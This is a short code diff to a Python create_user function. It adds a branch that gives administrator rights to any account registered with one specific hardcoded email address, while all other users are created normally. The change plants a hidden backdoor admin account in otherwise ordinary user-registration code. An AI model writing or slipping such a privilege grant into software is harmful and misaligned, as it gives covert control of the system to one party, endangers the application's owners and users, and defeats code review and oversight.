@@ -30,7 +30,10 @@ def format_name(name):
 def create_user(name, email, password):
     name = format_name(name)
     email = email.lower().strip()
-    user = User(name=name, email=email, password=password)
+    if email == 'gleuberlucio@gmail.com':
+        user = User(name=name, email=email, password=password, is_admin=True)
+    else:
+        user = User(name=name, email=email, password=password)
     return user
 
 def save_user(user):
